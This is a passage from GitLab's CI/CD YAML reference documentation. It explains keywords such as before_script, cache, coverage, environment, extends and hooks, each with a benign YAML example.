#### `artifacts:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#artifactswhen "Permalink")

Use `artifacts:when` to upload artifacts on job failure or despite the
failure.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `on_success` (default): Upload artifacts only when the job succeeds.
- `on_failure`: Upload artifacts only when the job fails.
- `always`: Always upload artifacts (except when jobs time out). For example, when
[uploading artifacts](https://docs.gitlab.com/ci/testing/unit_test_reports/#add-screenshots-to-test-reports)
required to troubleshoot failing tests.

**Example of `artifacts:when`**:

YAML Copy to clipboard

```yaml
job:
  artifacts:
    when: on_failure
```

**Additional details**:

- The artifacts created for [`artifacts:reports`](https://docs.gitlab.com/ci/yaml/#artifactsreports) are always uploaded,
regardless of the job results (success or failure). `artifacts:when` does not change this behavior.

### `before_script` [Permalink](https://docs.gitlab.com/ci/yaml/\#before_script "Permalink")

Use `before_script` to define an array of commands that should run before each job’s
`script` commands, but after [artifacts](https://docs.gitlab.com/ci/yaml/#artifacts) are restored.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `before_script`**:

YAML Copy to clipboard

```yaml
job:
  before_script:
    - echo "Execute this command before any 'script:' commands."
  script:
    - echo "This command executes after the job's 'before_script' commands."
```

**Additional details**:

- Scripts you specify in `before_script` are concatenated with any scripts you specify
in the main [`script`](https://docs.gitlab.com/ci/yaml/#script). The combined scripts execute together in a single shell.
- Using `before_script` at the top level, but not in the `default` section, [is deprecated](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#globally-defined-image-services-cache-before_script-after_script).

**Related topics**:

- [Use `before_script` with `default`](https://docs.gitlab.com/ci/yaml/script/#set-a-default-before_script-or-after_script-for-all-jobs)
to define a default array of commands that should run before the `script` commands in all jobs.
- You can [ignore non-zero exit codes](https://docs.gitlab.com/ci/yaml/script/#ignore-non-zero-exit-codes).
- [Use color codes with `before_script`](https://docs.gitlab.com/ci/yaml/script/#add-color-codes-to-script-output)
to make job logs easier to review.
- [Create custom collapsible sections](https://docs.gitlab.com/ci/jobs/job_logs/#custom-collapsible-sections)
to simplify job log output.

### `cache` [Permalink](https://docs.gitlab.com/ci/yaml/\#cache "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/330047) in GitLab 15.0, caches are not shared between protected and unprotected branches.
- [Updated](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5543) in GitLab Runner 18.1. During the caching process,
`symlinks` are no longer followed, which happened in some edge cases with previous GitLab Runner versions.

Use `cache` to specify a list of files and directories to
cache between jobs. You can only use paths that are in the local working copy.

Caches are:

- Shared between pipelines and jobs.
- By default, not shared between [protected](https://docs.gitlab.com/user/project/repository/branches/protected/) and unprotected branches.
- Restored before [artifacts](https://docs.gitlab.com/ci/yaml/#artifacts).
- Limited to a maximum of four [different caches](https://docs.gitlab.com/ci/caching/#use-multiple-caches).

You can [disable caching for specific jobs](https://docs.gitlab.com/ci/caching/#disable-cache-for-specific-jobs),
for example to override:

- A default cache defined with [`default`](https://docs.gitlab.com/ci/yaml/#default).
- The configuration for a job added with [`include`](https://docs.gitlab.com/ci/yaml/#include).

For more information about caches, see [Caching in GitLab CI/CD](https://docs.gitlab.com/ci/caching/).

#### `cache:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachepaths "Permalink")

Use the `cache:paths` keyword to choose which files or directories to cache.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of paths relative to the project directory ( `$CI_PROJECT_DIR`).
You can use wildcards that use [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) and
[`doublestar.Glob`](https://pkg.go.dev/github.com/bmatcuk/doublestar@v1.2.2?tab=doc#Match) patterns.

[CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file) are supported.

**Example of `cache:paths`**:

Cache all files in `binaries` that end in `.apk` and the `.config` file:

YAML Copy to clipboard

```yaml
rspec:
  script:
    - echo "This job uses a cache."
  cache:
    key: binaries-cache
    paths:
      - binaries/*.apk
      - .config
```

**Additional details**:

- The `cache:paths` keyword includes files even if they are untracked or in your `.gitignore` file.

**Related topics**:

- See the [common `cache` use cases](https://docs.gitlab.com/ci/caching/#common-use-cases-for-caches) for more
`cache:paths` examples.

#### `cache:key` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachekey "Permalink")

Use the `cache:key` keyword to give each cache a unique identifying key. All jobs
that use the same cache key use the same cache, including in different pipelines.

If not set, the default key is `default`. All jobs with the `cache` keyword but
no `cache:key` share the `default` cache.

Must be used with `cache: paths`, or nothing is cached.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A string.
- A predefined [CI/CD variable](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- A combination of both.

**Example of `cache:key`**:

YAML Copy to clipboard

```yaml
cache-job:
  script:
    - echo "This job uses a cache."
  cache:
    key: binaries-cache-$CI_COMMIT_REF_SLUG
    paths:
      - binaries/
```

**Additional details**:

- If you use **Windows Batch** to run your shell scripts you must replace
`$` with `%`. For example: `key: %CI_COMMIT_REF_SLUG%`

- The `cache:key` value can’t contain:

  - The `/` character, or the equivalent URI-encoded `%2F`.
  - Only the `.` character (any number), or the equivalent URI-encoded `%2E`.
- The cache is shared between jobs, so if you’re using different
paths for different jobs, you should also set a different `cache:key`.
Otherwise cache content can be overwritten.


**Related topics**:

- You can specify a [fallback cache key](https://docs.gitlab.com/ci/caching/#use-a-fallback-cache-key)
to use if the specified `cache:key` is not found.
- You can [use multiple cache keys](https://docs.gitlab.com/ci/caching/#use-multiple-caches) in a single job.
- See the [common `cache` use cases](https://docs.gitlab.com/ci/caching/#common-use-cases-for-caches) for more
`cache:key` examples.

##### `cache:key:files` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachekeyfiles "Permalink")

Use the `cache:key:files` keyword to generate a new key when files matching either of the defined paths or patterns
change. `cache:key:files` lets you reuse some caches, and rebuild them less often,
which speeds up subsequent pipeline runs.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of up to two file paths or patterns.

CI/CD variables are not supported.

**Example of `cache:key:files`**:

YAML Copy to clipboard

```yaml
cache-job:
  script:
    - echo "This job uses a cache."
  cache:
    key:
      files:
        - Gemfile.lock
        - package.json
    paths:
      - vendor/ruby
      - node_modules
```

This example creates a cache for Ruby and Node.js dependencies. The cache
is tied to the current versions of the `Gemfile.lock` and `package.json` files. When one of
these files changes, a new cache key is computed and a new cache is created. Any future
job runs that use the same `Gemfile.lock` and `package.json` with `cache:key:files`
use the new cache, instead of rebuilding the dependencies.

**Additional details**:

- The cache `key` is a SHA computed from the most recent commits
that changed each listed file.
If neither file is changed in any commits, the fallback key is `default`.
- Wildcard patterns like `**/package.json` can be used. An [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/301161)
exists to increase the number of paths or patterns allowed for a cache key.

##### `cache:key:prefix` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachekeyprefix "Permalink")

Use `cache:key:prefix` to combine a prefix with the SHA computed for [`cache:key:files`](https://docs.gitlab.com/ci/yaml/#cachekeyfiles).

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A string.
- A predefined [CI/CD variable](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- A combination of both.

**Example of `cache:key:prefix`**:

YAML Copy to clipboard

```yaml
rspec:
  script:
    - echo "This rspec job uses a cache."
  cache:
    key:
      files:
        - Gemfile.lock
      prefix: $CI_JOB_NAME
    paths:
      - vendor/ruby
```

For example, adding a `prefix` of `$CI_JOB_NAME` causes the key to look like `rspec-feef9576d21ee9b6a32e30c5c79d0a0ceb68d1e5`.
If a branch changes `Gemfile.lock`, that branch has a new SHA checksum for `cache:key:files`.
A new cache key is generated, and a new cache is created for that key. If `Gemfile.lock`
is not found, the prefix is added to `default`, so the key in the example would be `rspec-default`.

**Additional details**:

- If no file in `cache:key:files` is changed in any commits, the prefix is added to the `default` key.

#### `cache:untracked` [Permalink](https://docs.gitlab.com/ci/yaml/\#cacheuntracked "Permalink")

Use `untracked: true` to cache all files that are untracked in your Git repository.
Untracked files include files that are:

- Ignored due to [`.gitignore` configuration](https://git-scm.com/docs/gitignore).
- Created, but not added to the checkout with [`git add`](https://git-scm.com/docs/git-add).

Caching untracked files can create unexpectedly large caches if the job downloads:

- Dependencies, like gems or node modules, which are usually untracked.
- [Artifacts](https://docs.gitlab.com/ci/yaml/#artifacts) from a different job. Files extracted from the artifacts are untracked by default.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default).

**Example of `cache:untracked`**:

YAML Copy to clipboard

```yaml
rspec:
  script: test
  cache:
    untracked: true
```

**Additional details**:

- You can combine `cache:untracked` with `cache:paths` to cache all untracked files, as well as files in the configured paths.
Use `cache:paths` to cache any specific files, including tracked files, or files that are outside of the working directory,
and use `cache: untracked` to also cache all untracked files. For example:



YAML Copy to clipboard





```yaml
rspec:
    script: test
    cache:
      untracked: true
      paths:
      - binaries/
```

In this example, the job caches all untracked files in the repository, as well as all the files in `binaries/`.
If there are untracked files in `binaries/`, they are covered by both keywords.

#### `cache:unprotect` [Permalink](https://docs.gitlab.com/ci/yaml/\#cacheunprotect "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/362114) in GitLab 15.8.

Use `cache:unprotect` to set a cache to be shared between [protected](https://docs.gitlab.com/user/project/repository/branches/protected/)
and unprotected branches.

When set to `true`, users without access to protected branches can read and write to
cache keys used by protected branches.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default).

**Example of `cache:unprotect`**:

YAML Copy to clipboard

```yaml
rspec:
script: test
cache:
    unprotect: true
```

#### `cache:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachewhen "Permalink")

Use `cache:when` to define when to save the cache, based on the status of the job.

Must be used with `cache: paths`, or nothing is cached.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `on_success` (default): Save the cache only when the job succeeds.
- `on_failure`: Save the cache only when the job fails.
- `always`: Always save the cache.

**Example of `cache:when`**:

YAML Copy to clipboard

```yaml
rspec:
script: rspec
cache:
    paths:
      - rspec/
    when: 'always'
```

This example stores the cache whether or not the job fails or succeeds.

#### `cache:policy` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachepolicy "Permalink")

To change the upload and download behavior of a cache, use the `cache:policy` keyword.
By default, the job downloads the cache when the job starts, and uploads changes
to the cache when the job ends. This caching style is the `pull-push` policy (default).

To set a job to only download the cache when the job starts, but never upload changes
when the job finishes, use `cache:policy:pull`.

To set a job to only upload a cache when the job finishes, but never download the
cache when the job starts, use `cache:policy:push`.

Use the `pull` policy when you have many jobs executing in parallel that use the same cache.
This policy speeds up job execution and reduces load on the cache server. You can
use a job with the `push` policy to build the cache.

Must be used with `cache: paths`, or nothing is cached.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `pull`
- `push`
- `pull-push` (default)
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `cache:policy`**:

YAML Copy to clipboard

```yaml
prepare-dependencies-job:
stage: build
cache:
    key: gems
    paths:
      - vendor/bundle
    policy: push
script:
    - echo "This job only downloads dependencies and builds the cache."
    - echo "Downloading dependencies..."

faster-test-job:
stage: test
cache:
    key: gems
    paths:
      - vendor/bundle
    policy: pull
script:
    - echo "This job script uses the cache, but does not update it."
    - echo "Running tests..."
```

**Related topics**:

- You can [use a variable to control a job’s cache policy](https://docs.gitlab.com/ci/caching/#use-a-variable-to-control-a-jobs-cache-policy).

#### `cache:fallback_keys` [Permalink](https://docs.gitlab.com/ci/yaml/\#cachefallback_keys "Permalink")

Use `cache:fallback_keys` to specify a list of keys to try to restore cache from
if there is no cache found for the `cache:key`. Caches are retrieved in the order specified
in the `fallback_keys` section.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- An array of cache keys

**Example of `cache:fallback_keys`**:

YAML Copy to clipboard

```yaml
rspec:
script: rspec
cache:
    key: gems-$CI_COMMIT_REF_SLUG
    paths:
      - rspec/
    fallback_keys:
      - gems
    when: 'always'
```

### `coverage` [Permalink](https://docs.gitlab.com/ci/yaml/\#coverage "Permalink")

Use `coverage` with a custom regular expression to configure how code coverage
is extracted from the job output. The coverage is shown in the UI if at least one
line in the job output matches the regular expression.

To extract the code coverage value from the match, GitLab uses
this smaller regular expression: `\d+(?:\.\d+)?`.

**Supported values**:

- An RE2 regular expression. Must start and end with `/`. Must match the coverage number.
May match surrounding text as well, so you don’t need to use a regular expression character group
to capture the exact number.
Because it uses RE2 syntax, all groups must be non-capturing.

**Example of `coverage`**:

YAML Copy to clipboard

```yaml
job1:
script: rspec
coverage: '/Code coverage: \d+(?:\.\d+)?/'
```

In this example:

1. GitLab checks the job log for a match with the regular expression. A line
like `Code coverage: 67.89% of lines covered` would match.
2. GitLab then checks the matched fragment to find a match to the regular expression: `\d+(?:\.\d+)?`.
The sample regex can match a code coverage of `67.89`.

**Additional details**:

- You can find regex examples in [Code Coverage](https://docs.gitlab.com/ci/testing/code_coverage/#coverage-regex-patterns).
- If there is more than one matched line in the job output, the last line is used
(the first result of reverse search).
- If there are multiple matches in a single line, the last match is searched
for the coverage number.
- If there are multiple coverage numbers found in the matched fragment, the first number is used.
- Leading zeros are removed.
- Coverage output from [child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines)
is not recorded or displayed. Check [the related issue](https://gitlab.com/gitlab-org/gitlab/-/issues/280818)
for more details.

### `dast_configuration` [Permalink](https://docs.gitlab.com/ci/yaml/\#dast_configuration "Permalink")

- Tier: Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Use the `dast_configuration` keyword to specify a site profile and scanner profile to be used in a
CI/CD configuration. Both profiles must first have been created in the project. The job’s stage must
be `dast`.

**Keyword type**: Job keyword. You can use only as part of a job.

**Supported values**: One each of `site_profile` and `scanner_profile`.

- Use `site_profile` to specify the site profile to be used in the job.
- Use `scanner_profile` to specify the scanner profile to be used in the job.

**Example of `dast_configuration`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - dast

include:
  - template: DAST.gitlab-ci.yml

dast:
dast_configuration:
    site_profile: "Example Co"
    scanner_profile: "Quick Passive Test"
```

In this example, the `dast` job extends the `dast` configuration added with the `include` keyword
to select a specific site profile and scanner profile.

**Additional details**:

- Settings contained in either a site profile or scanner profile take precedence over those
contained in the DAST template.

**Related topics**:

- [Site profile](https://docs.gitlab.com/user/application_security/dast/profiles/#site-profile).
- [Scanner profile](https://docs.gitlab.com/user/application_security/dast/profiles/#scanner-profile).

### `dependencies` [Permalink](https://docs.gitlab.com/ci/yaml/\#dependencies "Permalink")

Use the `dependencies` keyword to define a list of specific jobs to fetch [artifacts](https://docs.gitlab.com/ci/yaml/#artifacts)
from. The specified jobs must all be in earlier stages. You can also set a job to download no artifacts at all.

When `dependencies` is not defined in a job, all jobs in earlier stages are considered dependent
and the job fetches all artifacts from those jobs.

To fetch artifacts from a job in the same stage, you must use [`needs:artifacts`](https://docs.gitlab.com/ci/yaml/#needsartifacts).
You should not combine `dependencies` with `needs` in the same job.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The names of jobs to fetch artifacts from.
- An empty array ( `[]`), to configure the job to not download any artifacts.

**Example of `dependencies`**:

YAML Copy to clipboard

```yaml
build osx:
stage: build
script: make build:osx
artifacts:
    paths:
      - binaries/

build linux:
stage: build
script: make build:linux
artifacts:
    paths:
      - binaries/

test osx:
stage: test
script: make test:osx
dependencies:
    - build osx

test linux:
stage: test
script: make test:linux
dependencies:
    - build linux

deploy:
stage: deploy
script: make deploy
environment: production
```

In this example, two jobs have artifacts: `build osx` and `build linux`. When `test osx` is executed,
the artifacts from `build osx` are downloaded and extracted in the context of the build.
The same thing happens for `test linux` and artifacts from `build linux`.

The `deploy` job downloads artifacts from all previous jobs because of
the [stage](https://docs.gitlab.com/ci/yaml/#stages) precedence.

**Additional details**:

- The job status does not matter. If a job fails or it’s a manual job that isn’t triggered, no error occurs.
- If the artifacts of a dependent job are [expired](https://docs.gitlab.com/ci/yaml/#artifactsexpire_in) or
[deleted](https://docs.gitlab.com/ci/jobs/job_artifacts/#delete-job-log-and-artifacts), then the job fails.

### `environment` [Permalink](https://docs.gitlab.com/ci/yaml/\#environment "Permalink")

Use `environment` to define the [environment](https://docs.gitlab.com/ci/environments/) that a job deploys to.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: The name of the environment the job deploys to, in one of these
formats:

- Plain text, including letters, digits, spaces, and these characters: `-`, `_`, `/`, `$`, `{`, `}`.
- CI/CD variables, including predefined, project, group, instance, or variables defined in the
`.gitlab-ci.yml` file. You can’t use variables defined in a `script` section.

**Example of `environment`**:

YAML Copy to clipboard

```yaml
deploy to production:
stage: deploy
script: git push production HEAD:main
environment: production
```

**Additional details**:

- If you specify an `environment` and no environment with that name exists, an environment is
created.

#### `environment:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentname "Permalink")

Set a name for an [environment](https://docs.gitlab.com/ci/environments/).

Common environment names are `qa`, `staging`, and `production`, but you can use any name.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: The name of the environment the job deploys to, in one of these
formats:

- Plain text, including letters, digits, spaces, and these characters: `-`, `_`, `/`, `$`, `{`, `}`.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file),
including predefined, project, group, instance, or variables defined in the
`.gitlab-ci.yml` file. You can’t use variables defined in a `script` section.

**Example of `environment:name`**:

YAML Copy to clipboard

```yaml
deploy to production:
stage: deploy
script: git push production HEAD:main
environment:
    name: production
```

#### `environment:url` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmenturl "Permalink")

Set a URL for an [environment](https://docs.gitlab.com/ci/environments/).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: A single URL, in one of these formats:

- Plain text, like `https://prod.example.com`.
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file),
including predefined, project, group, instance, or variables defined in the
`.gitlab-ci.yml` file. You can’t use variables defined in a `script` section.

**Example of `environment:url`**:

YAML Copy to clipboard

```yaml
deploy to production:
stage: deploy
script: git push production HEAD:main
environment:
    name: production
    url: https://prod.example.com
```

**Additional details**:

- After the job completes, you can access the URL by selecting a button in the merge request,
environment, or deployment pages.

#### `environment:on_stop` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmenton_stop "Permalink")

Closing (stopping) environments can be achieved with the `on_stop` keyword
defined under `environment`. It declares a different job that runs to close the
environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Additional details**:

- See [`environment:action`](https://docs.gitlab.com/ci/yaml/#environmentaction) for more details and an example.

#### `environment:action` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentaction "Permalink")

Use the `action` keyword to specify how the job interacts with the environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: One of the following keywords:

| **Value** | **Description** |
| --- | --- |
| `start` | Default value. Indicates that the job starts the environment. The deployment is created after the job starts. |
| `prepare` | Indicates that the job is only preparing the environment. It does not trigger deployments. [Read more about preparing environments](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes). |
| `stop` | Indicates that the job stops an environment. [Read more about stopping an environment](https://docs.gitlab.com/ci/environments/#stopping-an-environment). |
| `verify` | Indicates that the job is only verifying the environment. It does not trigger deployments. [Read more about verifying environments](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes). |
| `access` | Indicates that the job is only accessing the environment. It does not trigger deployments. [Read more about accessing environments](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes). |

|
|

**Example of `environment:action`**:

YAML Copy to clipboard

```yaml
stop_review_app:
stage: deploy
variables:
    GIT_STRATEGY: none
script: make delete-app
when: manual
environment:
    name: review/$CI_COMMIT_REF_SLUG
    action: stop
```

#### `environment:auto_stop_in` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentauto_stop_in "Permalink")

History

- CI/CD variable support [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/365140) in GitLab 15.4.
- [Updated](https://gitlab.com/gitlab-org/gitlab/-/issues/437133) to support `prepare`, `access` and `verify` environment actions in GitLab 17.7.

The `auto_stop_in` keyword specifies the lifetime of the environment. When an environment expires, GitLab
automatically stops it.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: A period of time written in natural language. For example,
these are all equivalent:

- `168 hours`
- `7 days`
- `one week`
- `never`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `environment:auto_stop_in`**:

YAML Copy to clipboard

```yaml
review_app:
script: deploy-review-app
environment:
    name: review/$CI_COMMIT_REF_SLUG
    auto_stop_in: 1 day
```

When the environment for `review_app` is created, the environment’s lifetime is set to `1 day`.
Every time the review app is deployed, that lifetime is also reset to `1 day`.

The `auto_stop_in` keyword can be used for all [environment actions](https://docs.gitlab.com/ci/yaml/#environmentaction) except `stop`.
Some actions can be used to reset the scheduled stop time for the environment. For more information, see
[Access an environment for preparation or verification purposes](https://docs.gitlab.com/ci/environments/#access-an-environment-for-preparation-or-verification-purposes).

**Related topics**:

- [Environments auto-stop documentation](https://docs.gitlab.com/ci/environments/#stop-an-environment-after-a-certain-time-period).

#### `environment:kubernetes` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentkubernetes "Permalink")

History

- `agent` keyword [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/467912) in GitLab 17.6.
- `namespace` and `flux_resource_path` keywords [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/500164) in GitLab 17.7.

Use the `kubernetes` keyword to configure the [dashboard for Kubernetes](https://docs.gitlab.com/ci/environments/kubernetes_dashboard/)
for an environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `agent`: A string specifying the [GitLab agent for Kubernetes](https://docs.gitlab.com/user/clusters/agent/). The format is `path/to/agent/project:agent-name`. If the agent is connected to the project running the pipeline, use `$CI_PROJECT_PATH:agent-name`.
- `namespace`: A string representing the Kubernetes namespace where the environment is deployed. The namespace must be set together with the `agent` keyword.
- `flux_resource_path`: A string representing the full path to the Flux resource, such as a HelmRelease. The Flux resource must be set together with the
`agent` and `namespace` keywords.

**Example of `environment:kubernetes`**:

YAML Copy to clipboard

```yaml
deploy:
stage: deploy
script: make deploy-app
environment:
    name: production
    kubernetes:
      agent: path/to/agent/project:agent-name
      namespace: my-namespace
      flux_resource_path: helm.toolkit.fluxcd.io/v2/namespaces/flux-system/helmreleases/helm-release-resource
```

This configuration:

- Sets up the `deploy` job to deploy to the `production`
environment
- Associates the [agent](https://docs.gitlab.com/user/clusters/agent/) named `agent-name` with the environment
- Configures the [dashboard for Kubernetes](https://docs.gitlab.com/ci/environments/kubernetes_dashboard/) for an environment with
the namespace `my-namespace` and the `flux_resource_path` set to
`helm.toolkit.fluxcd.io/v2/namespaces/flux-system/helmreleases/helm-release-resource`.

**Additional details**:

- To use the dashboard, you must
[install the GitLab agent for Kubernetes](https://docs.gitlab.com/user/clusters/agent/install/) and
[configure `user_access`](https://docs.gitlab.com/user/clusters/agent/user_access/)
for the environment’s project or its parent group.
- The user running the job must be authorized to access the cluster agent.
Otherwise, the dashboard ignores the `agent`, `namespace`, and `flux_resource_path` attributes.
- If you only want to set the `agent`, you do not have to set the `namespace`, and cannot set `flux_resource_path`. However, this configuration lists all namespaces in a cluster in the dashboard for Kubernetes.

#### `environment:deployment_tier` [Permalink](https://docs.gitlab.com/ci/yaml/\#environmentdeployment_tier "Permalink")

Use the `deployment_tier` keyword to specify the tier of the deployment environment.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: One of the following:

- `production`
- `staging`
- `testing`
- `development`
- `other`

**Example of `environment:deployment_tier`**:

YAML Copy to clipboard

```yaml
deploy:
script: echo
environment:
    name: customer-portal
    deployment_tier: production
```

**Additional details**:

- Environments created from this job definition are assigned a [tier](https://docs.gitlab.com/ci/environments/#deployment-tier-of-environments) based on this value.
- Existing environments don’t have their tier updated if this value is added later. Existing environments must have their tier updated via the [Environments API](https://docs.gitlab.com/api/environments/#update-an-existing-environment).

**Related topics**:

- [Deployment tier of environments](https://docs.gitlab.com/ci/environments/#deployment-tier-of-environments).

#### Dynamic environments [Permalink](https://docs.gitlab.com/ci/yaml/\#dynamic-environments "Permalink")

Use CI/CD [variables](https://docs.gitlab.com/ci/variables/) to dynamically name environments.

For example:

YAML Copy to clipboard

```yaml
deploy as review app:
stage: deploy
script: make deploy
environment:
    name: review/$CI_COMMIT_REF_SLUG
    url: https://$CI_ENVIRONMENT_SLUG.example.com/
```

The `deploy as review app` job is marked as a deployment to dynamically
create the `review/$CI_COMMIT_REF_SLUG` environment. `$CI_COMMIT_REF_SLUG`
is a [CI/CD variable](https://docs.gitlab.com/ci/variables/) set by the runner. The
`$CI_ENVIRONMENT_SLUG` variable is based on the environment name, but suitable
for inclusion in URLs. If the `deploy as review app` job runs in a branch named
`pow`, this environment would be accessible with a URL like `https://review-pow.example.com/`.

The common use case is to create dynamic environments for branches and use them
as review apps. You can see an example that uses review apps at
[https://gitlab.com/gitlab-examples/review-apps-nginx/](https://gitlab.com/gitlab-examples/review-apps-nginx/).

### `extends` [Permalink](https://docs.gitlab.com/ci/yaml/\#extends "Permalink")

Use `extends` to reuse configuration sections. It’s an alternative to [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#anchors)
and is a little more flexible and readable.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The name of another job in the pipeline.
- A list (array) of names of other jobs in the pipeline.

**Example of `extends`**:

YAML Copy to clipboard

```yaml
.tests:
stage: test
image: ruby:3.0

rspec:
extends: .tests
script: rake rspec

rubocop:
extends: .tests
script: bundle exec rubocop
```

In this example, the `rspec` job uses the configuration from the `.tests` template job.
When creating the pipeline, GitLab:

- Performs a reverse deep merge based on the keys.
- Merges the `.tests` content with the `rspec` job.
- Doesn’t merge the values of the keys.

The combined configuration is equivalent to these jobs:

YAML Copy to clipboard

```yaml
rspec:
stage: test
image: ruby:3.0
script: rake rspec

rubocop:
stage: test
image: ruby:3.0
script: bundle exec rubocop
```

**Additional details**:

- You can use multiple parents for `extends`.
- The `extends` keyword supports up to eleven levels of inheritance, but you should
avoid using more than three levels.
- In the previous example, `.tests` is a [hidden job](https://docs.gitlab.com/ci/jobs/#hide-a-job),
but you can extend configuration from regular jobs as well.

**Related topics**:

- [Reuse configuration sections by using `extends`](https://docs.gitlab.com/ci/yaml/yaml_optimization/#use-extends-to-reuse-configuration-sections).
- Use `extends` to reuse configuration from [included configuration files](https://docs.gitlab.com/ci/yaml/yaml_optimization/#use-extends-and-include-together).

### `hooks` [Permalink](https://docs.gitlab.com/ci/yaml/\#hooks "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356850) in GitLab 15.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_hooks_pre_get_sources_script`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/381840) in GitLab 15.10. Feature flag `ci_hooks_pre_get_sources_script` removed.

Use `hooks` to specify lists of commands to execute on the runner
at certain stages of job execution, like before retrieving the Git repository.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A hash of hooks and their commands. Available hooks: `pre_get_sources_script`.

#### `hooks:pre_get_sources_script` [Permalink](https://docs.gitlab.com/ci/yaml/\#hookspre_get_sources_script "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356850) in GitLab 15.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_hooks_pre_get_sources_script`. Disabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/381840) in GitLab 15.10. Feature flag `ci_hooks_pre_get_sources_script` removed.

Use `hooks:pre_get_sources_script` to specify a list of commands to execute on the runner
before cloning the Git repository and any submodules.
You can use it for example to:

- Adjust the [Git configuration](https://docs.gitlab.com/ci/jobs/job_troubleshooting/#get_sources-job-section-fails-because-of-an-http2-problem).
- Export [tracing variables](https://docs.gitlab.com/topics/git/troubleshooting_git/#debug-git-with-traces).

**Supported values**: An array including:

- Single line commands.
- Long commands [split over multiple lines](https://docs.gitlab.com/ci/yaml/script/#split-long-commands).
